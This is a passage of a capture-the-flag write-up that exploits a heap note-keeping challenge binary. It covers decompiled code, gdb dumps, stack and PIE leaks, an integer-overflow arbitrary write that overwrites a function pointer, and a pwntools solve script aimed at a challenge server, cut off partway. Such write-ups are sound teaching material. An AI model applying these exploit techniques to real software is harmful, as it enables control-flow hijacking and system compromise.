<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">get_from_user</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buffer</span><span class="p">,</span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span>
<span class="w">  </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">sVar2</span><span class="p">;</span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">cnt</span><span class="p">;</span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_10</span><span class="p">;</span>

<span class="w">  </span><span class="n">local_10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span>
<span class="w">  </span><span class="n">cnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">buffer</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">sVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sVar2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">cnt</span><span class="p">))</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_00101359</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="n">buffer</span><span class="p">[</span><span class="n">cnt</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="w">      </span><span class="n">cnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cnt</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="nl">LAB_00101359</span><span class="p">:</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Quite a large function just for reading an input. As we can see, it reads a single byte at a time, and then checks if the byte is "\n". We can also see, that the function refrains from writing the last byte. So when the program requests 0x11 bytes, it actually gets 0x10, damnit. But this could still leak a value. In order to know what it could leak, let's dive into gdb.</p>
<p>Setting a breakpoint in the <code>print_author</code>-function, we can examine the structure after creating a single author. using <code>info file</code> to get the address of .bss, .bss contains this:</p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ x/22gx 0x0000555555603060
0x555555603060 &lt;stdout@@GLIBC_2.2.5&gt;:   0x00007ffff7df5760      0x0000000000000000
0x555555603070 &lt;stdin@@GLIBC_2.2.5&gt;:    0x00007ffff7df4a80      0x0000000000000000
0x555555603080 &lt;heap&gt;:  0x00007fffffffa610      0x00007fffffffde10
0x555555603090 &lt;heap_split_thresh&gt;:     0x0000000000000010      0x0000000000000008
0x5555556030a0 &lt;heap_max_blocks&gt;:       0x000000000000000a      0x0000000000000000
0x5555556030b0: 0x0000000000000000      0x0000000000000000
0x5555556030c0 &lt;authors&gt;:       0x00007fffffffa720      0x0000000000000000
0x5555556030d0 &lt;authors+16&gt;:    0x0000000000000000      0x0000000000000000
0x5555556030e0 &lt;authors+32&gt;:    0x0000000000000000      0x0000000000000000
0x5555556030f0 &lt;authors+48&gt;:    0x0000000000000000      0x0000000000000000
0x555555603100 &lt;authors+64&gt;:    0x0000000000000000      0x0000000000000000
</code></pre></div>

<p>Ignoring all but the authors section, we see an array of pointers containing one pointer. Inputting this pointer:</p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ x/8gx 0x00007fffffffa720
0x7fffffffa720: 0x4141414141414141      0x0041414141414141
0x7fffffffa730: 0x4242424242424242      0x0042424242424242
0x7fffffffa740: 0x00007fffffffa758      0x0000000000000010
0x7fffffffa750: 0x0000555555401219      0x4343434343434343
</code></pre></div>

<p>Interesting, the first name is stored in the first 16 bytes, surname in the next, a pointer to the note after that, then age, and finally the PrintNote function. The Note is located right after the main chunk in this case, only because it was the first available address. In theory its location within the heap is arbitrary. Back on track, it does indeed seem like we can leak the Note location. With that, we can calculate the location of the rip, perhaps useful later. Using the <code>modify_author</code>-function, we change the values:</p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ x/8gx 0x00007fffffffa720
0x7fffffffa720: 0x4141414141414141      0x0041414141414141
0x7fffffffa730: 0x4242424242424242      0x4242424242424242
0x7fffffffa740: 0x00007fffffffa758      0x000000000000000a
0x7fffffffa750: 0x0000555555401219      0x4343434343434343
</code></pre></div>

<p>And calling the <code>print_author</code>-function, we get a leak:</p>
<div class="codehilite"><pre><span></span><code>----------------------
Author 1
Name: AAAAAAAAAAAAAAA
Surname: BBBBBBBBBBBBBBBBX����
Age: 10
Note: [CCCCCCCC]
-----------------------
</code></pre></div>

<h2>Leaking pie</h2>
<p>After leaking the stack, i actually went blank for a while. I knew that the heap wasn't cleaned after use, so maybe if we created two authors, located right after one another in the heap, then deleted both, and created a new one in the first ones place, we could write values up until the <code>PrintNote</code>-function, thus leaking it through <code>print_author</code>. That might work, only one problem: <code>get_from_user</code> will only read $n-1$ bytes into the program. Here, we make use of the off-by-one error in <code>add_author</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">257</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">get_from_user</span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Note</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</code></pre></div>

<p>As you can see, we can actually write the full 256 bytes, if we specify 256 as the length. Doing this by hand is cumbersome, so i wrote up a little script to test it:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/peda/peda.py&quot;</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;./auth&quot;</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">break *print_author</span>
<span class="s1">break *main</span>
<span class="s1">c</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">add_author</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">sur_name</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">note_size</span><span class="p">,</span> <span class="n">note</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">first_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">sur_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">note_size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">note</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">index</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">index</span>

<span class="k">def</span> <span class="nf">delete_author</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">leak_pie</span><span class="p">():</span>
    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">a2</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>

    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a2</span><span class="p">)</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;G&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span> <span class="o">*</span> <span class="mi">257</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">print_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="n">last_i</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;I&quot;</span><span class="p">)</span>
    <span class="n">last_b</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;]&quot;</span><span class="p">)</span>

    <span class="n">pie_leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">last_i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">last_b</span><span class="p">])</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">pie_leak</span>

<span class="n">pie_leak</span> <span class="o">=</span> <span class="n">leak_pie</span><span class="p">()</span>
</code></pre></div>

<p>The note length is carefully selected, such that the note from the new author and the <code>PrintNote</code> pointer from the old author lines up, leaking the address. Omitting the last section of <code>leak_pie</code>, and instead triggering interactive, we get this output:</p>
<div class="codehilite"><pre><span></span><code>----------------------
Author 1
Name: GGGGGGGG
Surname: HHHHHHHH
Age: 16
Note: [IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII@UUU]
-----------------------
</code></pre></div>

<p>Therefore, pie is leaked.</p>
<h2>The arbitrary write</h2>
<p>As we have now leaked both the stack and pie, we have to move on to actually exploiting the program. The solution to this took me the longest, and it required quite a bit of pondering. The main trick of this exploit, is the very same off-by-one error that we used earlier:</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="w">  </span><span class="n">note_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ta_alloc</span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Note</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">note_address</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Note</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid allocation!&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note: &quot;</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">257</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Note</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu added!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="k">return</span><span class="p">;</span>
</code></pre></div>

<p>Do you see anything unusual here? If you noticed it, props to you, if not, look at line 3:</p>
<div class="codehilite"><pre><span></span><code><span class="n">note_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ta_alloc</span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
</code></pre></div>

<p>The program allocates note_size + 1, without any kind of overflow prevention. If note_size is the maximum value, which in the case of the llu is $2^{64}-1$, then the program will actually allocate 0 bytes. Then further down, the size will be set to the default, 256. ta_alloc will think the program needs 0 bytes, thus returning a pointer that <em>could</em> be right before an allocated section. This would allow us to overwrite values in other authors. This might not sound so useful, until we realize, that the Author object holds a pointer to the <code>PrintNote</code>-function, which it calls during <code>print_author</code>. If we can write our own value into this field, then we can redirect codeflow for a function call.</p>
<p>This is a breakthrough, but we are not done yet. Even if we can call an arbitrary address using this method, we still don't have the ability to pop a shell. We can't call system("/bin/sh"), as we haven't leaked libc yet, and NX is enabled, so no shellcode.</p>
<p>After some thinking, i arrived at a solution: We can use <code>get_from_user</code>. <code>get_from_user</code> takes two arguments, <code>*buffer</code> and <code>count</code>. We already control <code>*buffer</code>, as that would simply be the address of the Note, which we can overwrite. As for <code>count</code>, jumping into the assembly reveals, that rsi is actually assigned to age, due to the previous function call, a value that we can also overwrite. With this, we can craft an exploit:</p>
<ol>
<li>Create 2 authors with any size Note</li>
<li>Delete first author, chunk is put into freed</li>
<li>Create new author with a Note size of $2^{64}-1$<br />
<code>add_author</code> increments note_size by one as padding, overflowing the integer<br />
  tinyalloc allocates previous used space, together with pointer for a 0-byte chunk<br />
<code>add_author</code> sets default length 256, we can write bytes into 0-byte chunk<br />
  Note is carefully crafted, such that it overwrites:</li>
<li><code>PrintNote</code> with <code>get_from_user</code></li>
<li>*Note with rip-pointer</li>
</ol>
<p>Doing these steps, will create an author, that upon <code>print_author</code> being called, will write any user input into the rip-pointer, permantly establishing control over the return pointer.</p>
<h3>Leaking libc</h3>
<p>With control over rip established, we can easily leak the necesarry addresses to determine libc version. As it is fairly mundane, i will not go over the process. If you want to do it yourself, simply modify the <code>leak_libc</code> function in the final solution, to instead print the got-address of various functions, putting that into a database. I have chosen to include the correct libc version in this folder. The correct version is libc6_2.27-3ubuntu1.3_amd64.so.</p>
<hr />
<h2>Solution</h2>
<p>My final solution uses lots of helper function to make the experience easier. It can also be found in <code>solve.py</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">remote</span> <span class="o">=</span> <span class="kc">False</span>
<span class="k">if</span> <span class="s2">&quot;-r&quot;</span> <span class="ow">in</span> <span class="n">argv</span><span class="p">:</span>  <span class="c1"># Switch between local and remote</span>
    <span class="n">remote</span> <span class="o">=</span> <span class="kc">True</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./auth&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;178.62.63.223&quot;</span><span class="p">,</span> <span class="mi">30493</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-remote.so.6&quot;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-local.so.6&quot;</span><span class="p">)</span>

    <span class="c1"># conn = process(&quot;./auth&quot;)</span>
    <span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/peda/peda.py&quot;</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;./auth&quot;</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">    break *print_author</span>
<span class="s1">    break *main</span>
<span class="s1">    c</span>
<span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>  <span class="c1"># Using pwn.gdb for debug, can switch to straight process</span>

<span class="k">def</span> <span class="nf">address_from_bytes</span><span class="p">(</span><span class="n">by</span><span class="p">):</span>  <span class="c1"># Take a bytestring as input, pad and convert to address</span>
    <span class="n">by</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">by</span><span class="p">))</span>
    <span class="n">by</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">by</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">by</span>

<span class="k">def</span> <span class="nf">add_author</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">sur_name</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">note_size</span><span class="p">,</span> <span class="n">note</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>  <span class="c1"># Interact with add_author function</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">first_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">sur_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">note_size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">if</span> <span class="n">note</span><span class="p">:</span>  <span class="c1"># If note_size is 0, program won&#39;t ask for note contents</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">note</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">note</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span> <span class="k">else</span> <span class="n">note</span><span class="p">)</span>

    <span class="n">index</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>  <span class="c1"># Extract assigned id from response</span>
    <span class="k">return</span> <span class="n">index</span>

<span class="k">def</span> <span class="nf">modify_author</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">sur_name</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>  <span class="c1"># Interact with modify_author function</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
